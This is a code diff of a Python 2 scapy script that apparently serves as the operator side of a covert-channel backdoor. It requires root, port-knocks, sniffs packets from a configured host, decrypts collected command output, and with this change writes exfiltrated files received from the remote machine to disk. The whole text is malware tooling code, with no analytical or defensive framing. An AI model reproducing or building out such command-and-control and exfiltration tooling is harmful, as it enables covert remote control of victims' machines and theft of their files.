@@ -1,12 +1,14 @@
 #!/usr/bin/python
 
-import time, configfile, logging, encryption, helpers, multiprocessing, os, sys
+import time, configfile, encryption, helpers, os, sys, logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from multiprocessing import Process
 
 # flag to determine when to stop reading the results of a command and decrypt everything
 flag = False
 Results = ""
+resultsForFiles = ""
 
 def checkRoot():
     if(os.getuid() != 0):
@@ -38,33 +40,32 @@ def recvCommand(packet):
         if packet.haslayer(Raw):
             if packet[Raw].load == configfile.password:
                 flag = True
-                print len(Results)
                 decryptedData = encryption.decrypt(Results, configfile.masterkey)
                 print decryptedData
                 Results = ""
 
 def recvFile(packet):
     flag = False
-    results = ""
+    global resultsForFiles
     if packet.haslayer(IP):
-        print "Hello"
         if packet[IP].src == configfile.ip:
             dataReceived = helpers.parsePacket(packet)
-            results += (dataReceived)
+            resultsForFiles += (dataReceived)
             if packet.haslayer(Raw):
                 if packet[Raw].load == configfile.password:
-                    print "2"
                     flag = True
-                    decryptedData = encryption.decrypt(results, configfile.password)
-                    print decryptedData
-                    results = ""
+                    decryptedData = encryption.decrypt(resultsForFiles, configfile.masterkey)
+                    fileName, fileData = decryptedData.split("\0", 1)
+                    fileDescriptor = open(fileName, 'wb')
+                    fileDescriptor.write(fileData)
+                    resultsForFiles = ""
 
 def main():
     global flag
     checkRoot()
     portKnock()
 
-    fileProcess = multiprocessing.Process(target=sniffForFile)
+    fileProcess = Process(target=sniffForFile)
     fileProcess.start()
 
     while 1:
